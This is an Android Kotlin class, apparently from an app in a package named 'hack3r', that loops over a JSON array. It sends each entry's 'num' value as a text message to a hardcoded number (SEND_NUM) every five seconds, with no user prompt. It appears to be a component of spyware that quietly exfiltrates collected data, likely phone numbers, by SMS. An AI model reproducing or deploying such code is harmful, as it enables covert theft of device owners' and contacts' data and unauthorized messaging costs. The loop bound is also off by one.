package com.hack3r.amshel.mutall.utilities

import android.telephony.SmsManager
import org.json.JSONArray
import org.json.JSONException

class SendSms(val array: JSONArray):Thread(), Runnable{

    override fun run() {
        sendMessages()
    }

    private fun sendMessages(){
        val manager = SmsManager.getDefault()

        var msgLen = 0

        while (msgLen <= array.length()){
            try {
                val json = array.getJSONObject(msgLen)
                val body = json.getString("num")


                manager.sendTextMessage(SEND_NUM, null, body, null, null)
                sleep(5000)
            }catch (e:JSONException){
                e.printStackTrace()
            }catch (e:InterruptedException){
                e.printStackTrace()
            }
            msgLen ++
        }
    }
}